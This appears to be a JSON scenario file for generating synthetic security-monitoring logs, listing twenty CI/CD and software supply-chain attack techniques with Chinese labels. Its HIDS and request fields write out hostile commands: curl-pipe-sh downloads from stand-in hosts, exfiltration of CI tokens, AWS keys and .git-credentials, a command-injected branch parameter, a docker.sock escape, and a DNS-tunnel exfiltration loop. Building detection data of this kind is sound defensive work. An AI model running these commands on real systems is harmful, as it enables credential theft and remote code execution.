@@ -1,0 +1,523 @@
+{
+ "form": "FC",
+ "scenarios": [
+  {
+   "idx": 1,
+   "technique": "npm 依赖 postinstall 钩子投毒（安装期拉取远程脚本）",
+   "stack": "node",
+   "host_num": 41,
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "path": "/api/v2/pipeline/run",
+   "carrier": "job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall",
+   "rasp_evidence": "{\"npm_lifecycle\": \"postinstall\", \"spawn\": \"sh -c\"}",
+   "hids": [
+    "curl 10.20.5.19/p.sh|sh /bin/sh curl 10.20.5.19/p.sh|sh <== /bin/sh -c 'install.js' <== node /usr/lib/npm"
+   ],
+   "ua": "windows-chrome",
+   "deltas": [
+    0,
+    1,
+    2,
+    58
+   ]
+  },
+  {
+   "idx": 2,
+   "technique": "PyPI 恶意包 setup.py 构建期执行（构建后端注入）",
+   "stack": "django",
+   "host_num": 88,
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "path": "/api/v2/packages/install",
+   "carrier": "pkg=reqeusts-utils&ver=1.2.3&build=setup.py&cmd=pip install",
+   "rasp_evidence": "{\"build_step\": \"setup.py\", \"exec\": \"os.system\"}",
+   "hids": [
+    "python setup.py install /usr/bin/python3 setup.py install <== /bin/sh -c 'pip install' <== python3 -m pip"
+   ],
+   "ua": "android14-pixel",
+   "deltas": [
+    0,
+    2,
+    1,
+    88
+   ]
+  },
+  {
+   "idx": 3,
+   "technique": "私服 Maven SNAPSHOT 制品覆盖投毒（构建期加载后门 jar）",
+   "stack": "java",
+   "host_num": 95,
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "path": "/repository/maven-snapshots",
+   "carrier": "PUT com/ops/build-tools/2.4.1-SNAPSHOT.jar",
+   "rasp_evidence": "{\"artifact\": \"build-tools.jar\", \"snapshot\": \"overwrite\"}",
+   "hids": [
+    "java -jar /tmp/bt.jar /usr/bin/java java -jar /tmp/bt.jar <== /bin/sh -c 'mvn -B package' <== /opt/mvn"
+   ],
+   "ua": "linux-x11-chrome",
+   "deltas": [
+    0,
+    1,
+    2,
+    118
+   ]
+  },
+  {
+   "idx": 4,
+   "technique": "Docker 基础镜像投毒（恶意 ENTRYPOINT 在流水线构建期触发）",
+   "stack": "go",
+   "host_num": 63,
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids"
+   ],
+   "path": "/v2/ops-corp/runner-base",
+   "carrier": "PUT layer sha256:9f2c41ab entrypoint=/bin/sh -c",
+   "rasp_evidence": "{\"image\": \"runner-base:1.4.0\", \"entrypoint\": \"/bin/sh\"}",
+   "hids": [
+    "curl -s 10.20.7.31/e.sh|sh /bin/sh curl -s 10.20.7.31/e.sh|sh <== /bin/sh -c 'entry.sh' <== runc:[2:INIT]"
+   ],
+   "ua": "windows11-edge",
+   "deltas": [
+    0,
+    2,
+    1,
+    58
+   ]
+  },
+  {
+   "idx": 5,
+   "technique": "CI 构建参数命令注入（branch 参数拼接 shell 并外带 CI_JOB_TOKEN）",
+   "stack": "node",
+   "host_num": 170,
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "path": "/api/v1/build/trigger",
+   "carrier": "?branch=main;curl 10.20.5.77/x.sh|sh&author=a",
+   "rasp_evidence": "{\"param_inject\": \"branch\", \"cmd\": \"curl|sh\"}",
+   "hids": [
+    "curl 10.20.5.77/x.sh|sh /bin/sh curl 10.20.5.77/x.sh|sh <== /bin/sh -c 'npm run build' <== node /usr/bin/npm",
+    "curl -d $CI_JOB_TOKEN 10.20.5.77 /usr/bin/curl curl -d $CI_JOB_TOKEN 10.20.5.77 <== /bin/sh -c 'env' <== node"
+   ],
+   "ua": "mac-safari",
+   "deltas": [
+    0,
+    1,
+    2,
+    58,
+    42
+   ]
+  },
+  {
+   "idx": 6,
+   "technique": "GitHub Actions workflow 篡改（PR 分支注入 run 步骤后强推）",
+   "stack": "rails",
+   "host_num": 145,
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "path": "/api/v4/projects/ops/ci/pipelines",
+   "carrier": "?src=.github/workflows/release.yml&step=run:curl 10.20.5.19",
+   "rasp_evidence": "{\"workflow\": \"release.yml\", \"secrets\": \"GITHUB_TOKEN\"}",
+   "hids": [
+    "curl 10.20.5.19/a.sh|sh /bin/sh curl 10.20.5.19/a.sh|sh <== /bin/sh -c 'runner step' <== Runner.Worker.Worker",
+    "git push -f origin main /usr/bin/git git push -f origin main <== /bin/sh -c 'git push' <== Runner.Worker"
+   ],
+   "ua": "ios-iphone",
+   "deltas": [
+    0,
+    2,
+    1,
+    88,
+    64
+   ]
+  },
+  {
+   "idx": 7,
+   "technique": "CI 环境变量密钥窃取（after_script 读取 agent.env 外带 AWS 密钥）",
+   "stack": "spring",
+   "host_num": 19,
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "path": "/api/v2/jobs/8841/trace",
+   "carrier": "?step=after_script&cmd=cat /etc/ci/agent.env",
+   "rasp_evidence": "{\"env_dump\": \"AWS_SECRET_ACCESS_KEY\", \"step\": \"after_script\"}",
+   "hids": [
+    "cat /etc/ci/agent.env /bin/cat cat /etc/ci/agent.env <== /bin/sh -c 'cat agent.env' <== java -jar ci.jar",
+    "curl -d@/tmp/e 10.20.5.19 /bin/sh curl -d@/tmp/e 10.20.5.19 <== /bin/sh -c 'env>/tmp/e' <== java -jar ci.jar"
+   ],
+   "ua": "windows-firefox",
+   "deltas": [
+    0,
+    1,
+    2,
+    118,
+    88
+   ]
+  },
+  {
+   "idx": 8,
+   "technique": "构建产物投毒（发布 jar 内替换 class 后 C2 回连确认）",
+   "stack": "java",
+   "host_num": 65,
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "path": "/api/v1/releases/upload",
+   "carrier": "PUT app-2.8.0.jar sha256:6f1d0c8a4b2e patch=app/lib/",
+   "rasp_evidence": "{\"artifact\": \"app-2.8.0.jar\", \"patched\": \"app/lib/\"}",
+   "hids": [
+    "cp bd.class app/lib/bd.class /bin/cp cp bd.class app/lib/bd.class <== /bin/sh -c 'cp bd.class' <== java -jar sign.jar"
+   ],
+   "ua": "windows-android13",
+   "dns_base": "kxqzrt-5a02.net",
+   "dns_gap_h": 3.4,
+   "dns_steps": [
+    44,
+    86
+   ],
+   "deltas": [
+    0,
+    2,
+    1,
+    118,
+    0,
+    44,
+    86
+   ]
+  },
+  {
+   "idx": 9,
+   "technique": "仓库 webhook SSRF 打到云元数据（169.254.169.254 IAM 凭据）",
+   "stack": "nginx",
+   "host_num": 51,
+   "shape": [
+    "waf",
+    "web",
+    "rasp",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "path": "/api/webhook/gitlab",
+   "carrier": "?url=http://169.254.169.254/latest/meta-data/iam",
+   "rasp_evidence": "{\"webhook_ssrf\": \"169.254.169.254\", \"ref\": \"main\"}",
+   "hids": [
+    "curl 169.254.169.254/iam /usr/bin/curl curl 169.254.169.254/iam <== nginx: worker process"
+   ],
+   "ua": "windows-chrome",
+   "dns_base": "glbwpt-3f7a.net",
+   "dns_gap_h": 1.8,
+   "dns_steps": [
+    33,
+    77
+   ],
+   "deltas": [
+    0,
+    1,
+    2,
+    58,
+    0,
+    33,
+    77
+   ]
+  },
+  {
+   "idx": 10,
+   "technique": "Git 凭据文件窃取（runner 任务接口打包 .git-credentials）",
+   "stack": "php",
+   "host_num": 33,
+   "shape": [
+    "waf",
+    "hids"
+   ],
+   "path": "/api/agent/tasks/run",
+   "carrier": "?task=shell&cmd=tar -cf /tmp/g.tgz .git-credentials id_rsa",
+   "rasp_evidence": "{\"task\": \"shell\", \"files\": \".git-credentials id_rsa\"}",
+   "hids": [
+    "tar cf /tmp/g.tgz .git-credentials id_rsa /bin/tar tar cf /tmp/g.tgz <== php-fpm: pool www"
+   ],
+   "ua": "windows11-edge",
+   "deltas": [
+    0,
+    58
+   ]
+  },
+  {
+   "idx": 11,
+   "technique": "CI 覆盖率上传脚本篡改（uploader 端点改指攻击者主机）",
+   "stack": "node",
+   "host_num": 120,
+   "shape": [
+    "waf",
+    "hids"
+   ],
+   "path": "/api/v1/artifacts/upload",
+   "carrier": "endpoint=https://10.20.5.19/coveralls&file=lcov.info",
+   "rasp_evidence": "{\"uploader\": \"coveralls\", \"endpoint\": \"10.20.5.19\"}",
+   "hids": [
+    "curl -T /etc/ci/agent.env 10.20.5.19 /usr/bin/curl curl -T /etc/ci/agent.env 10.20.5.19 <== node /opt/ci/upload.js"
+   ],
+   "ua": "mac-safari",
+   "deltas": [
+    0,
+    88
+   ]
+  },
+  {
+   "idx": 12,
+   "technique": "IaC 模板投毒（Terraform local-exec provisioner 执行远程脚本）",
+   "stack": "go",
+   "host_num": 8,
+   "shape": [
+    "waf",
+    "hids"
+   ],
+   "path": "/api/v1/iac/apply",
+   "carrier": "template=main.tf local-exec=curl 10.20.5.19/tf.sh|sh",
+   "rasp_evidence": "{\"iac\": \"local-exec\", \"template\": \"main.tf\"}",
+   "hids": [
+    "sh tf.sh /bin/sh sh tf.sh <== /bin/sh -c 'terraform apply' <== terraform-provider-local"
+   ],
+   "ua": "linux-x11-chrome",
+   "deltas": [
+    0,
+    118
+   ]
+  },
+  {
+   "idx": 13,
+   "technique": "容器 registry 凭据滥用（CI 身份推送被篡改镜像 tag）",
+   "stack": "java",
+   "host_num": 77,
+   "shape": [
+    "rasp",
+    "hids"
+   ],
+   "path": "/v2/ops-corp/api-gateway/blobs/uploads/",
+   "carrier": "push=ops-corp/api-gateway:2.8.0&force=1",
+   "rasp_evidence": "{\"registry_push\": \"api-gateway:2.8.0\", \"creds\": \"ci\"}",
+   "hids": [
+    "docker push ops/api-gateway:2.8.0 /usr/bin/docker docker push ops/api-gateway:2.8.0 <== containerd-shim"
+   ],
+   "ua": "android14-pixel",
+   "deltas": [
+    0,
+    58
+   ]
+  },
+  {
+   "idx": 14,
+   "technique": "包管理器源劫持（pip index-url 指向攻击者私服）",
+   "stack": "django",
+   "host_num": 190,
+   "shape": [
+    "rasp",
+    "hids"
+   ],
+   "path": "/api/v1/pip/config",
+   "carrier": "index-url=https://10.20.5.77/simple&trusted=1",
+   "rasp_evidence": "{\"index_url\": \"10.20.5.77/simple\", \"tool\": \"pip\"}",
+   "hids": [
+    "pip install -i 10.20.5.77/s reqeusts /usr/bin/pip pip install -i 10.20.5.77/s reqeusts <== python3 -m pip"
+   ],
+   "ua": "ios-iphone",
+   "deltas": [
+    0,
+    88
+   ]
+  },
+  {
+   "idx": 15,
+   "technique": "CI runner 逃逸到集群（docker.sock 挂载 + ServiceAccount token 提权）",
+   "stack": "go",
+   "host_num": 52,
+   "shape": [
+    "rasp",
+    "hids",
+    "hids"
+   ],
+   "path": "/api/v1/runner/shell",
+   "carrier": "?cmd=docker -H unix:///var/run/docker.sock run",
+   "rasp_evidence": "{\"runner\": \"dind\", \"sock\": \"docker.sock\"}",
+   "hids": [
+    "docker run -v /:/host alpine /usr/bin/docker docker run -v /:/host <== dockerd",
+    "kubectl --token=$SA_TOKEN auth whoami /usr/bin/kubectl kubectl --token=$SA_TOKEN auth whoami <== /bin/bash -c 'kubectl --token=$SA_TOKEN auth whoami' <== containerd-shim"
+   ],
+   "ua": "windows-firefox",
+   "deltas": [
+    0,
+    58,
+    47
+   ]
+  },
+  {
+   "idx": 16,
+   "technique": "CI 缓存投毒（缓存包内含恢复后钩子被 runner 执行）",
+   "stack": "nginx",
+   "host_num": 174,
+   "shape": [
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "tar xzf cache.tgz -C / && ./post.sh /bin/tar tar xzf cache.tgz -C / && ./post.sh <== Runner.Listener"
+   ],
+   "ua": "windows-android13",
+   "deltas": [
+    0
+   ]
+  },
+  {
+   "idx": 17,
+   "technique": "依赖混淆（占用内网包名的高版本公网同名包被自动拉取）",
+   "stack": "node",
+   "host_num": 96,
+   "shape": [
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "npm i ops-corp-telemetry@99.0.0 /usr/bin/npm npm i ops-corp-telemetry@99.0.0 <== node /usr/local/bin/npm",
+    "curl -d @pkg.json 203.0.113.44 /usr/bin/curl curl -d @pkg.json 203.0.113.44 <== node /usr/local/bin/npm"
+   ],
+   "ua": "windows-chrome",
+   "deltas": [
+    0,
+    42
+   ]
+  },
+  {
+   "idx": 18,
+   "technique": "发布 token 滥用（构建机持 token 直接推送恶意 gem 版本）",
+   "stack": "rails",
+   "host_num": 27,
+   "shape": [
+    "hids",
+    "hids",
+    "hids"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "gem build ops.gemspec /usr/bin/gem gem build ops.gemspec <== /bin/sh -c 'gem build' <== bundle exec gem exec rake",
+    "gem push ops-9.9.9.gem --key ci /usr/bin/gem gem push ops-9.9.9.gem <== bundle exec gem exec rake",
+    "git tag -f v9.9.9 /usr/bin/git git tag -f v9.9.9 <== /bin/sh -c 'git tag' <== bundle exec gem"
+   ],
+   "ua": "linux-x11-chrome",
+   "deltas": [
+    0,
+    88,
+    45
+   ]
+  },
+  {
+   "idx": 19,
+   "technique": "制品校验绕过发生产（校验脚本被改后部署未签名包）",
+   "stack": "go",
+   "host_num": 111,
+   "shape": [
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "sha256sum -c sum.txt && deploy --skip-verify nfx-1.4.tgz /usr/bin/sha256sum sha256sum -c sum.txt <== /bin/bash -c 'deploy --skip-verify nfx-1.4.tgz' <== java -jar /opt/deploy/agent.jar"
+   ],
+   "ua": "windows11-edge",
+   "dns_base": "wqnvhs-6d24.net",
+   "dns_gap_h": 2.1,
+   "dns_steps": [
+    28,
+    61
+   ],
+   "deltas": [
+    0,
+    0,
+    28,
+    61
+   ]
+  },
+  {
+   "idx": 20,
+   "technique": "供应链 C2 回连（打包 CI 凭据后经 DNS 隧道外传）",
+   "stack": "php",
+   "host_num": 143,
+   "shape": [
+    "hids",
+    "hids",
+    "dns",
+    "dns",
+    "dns"
+   ],
+   "path": "",
+   "carrier": "",
+   "rasp_evidence": "",
+   "hids": [
+    "base64 .git-credentials id_rsa > /tmp/.c /bin/base64 base64 .git-credentials <== php-fpm: pool www",
+    "for l in $(base64 /tmp/.c|fold -w30); do nslookup $l.rvnqzt-9b41.net; done for for l <== /bin/bash -c 'for' <== /usr/sbin/cron"
+   ],
+   "ua": "mac-safari",
+   "dns_base": "rvnqzt-9b41.net",
+   "dns_gap_h": 4.6,
+   "dns_steps": [
+    34,
+    79
+   ],
+   "deltas": [
+    0,
+    118,
+    0,
+    34,
+    79
+   ]
+  }
+ ]
+}
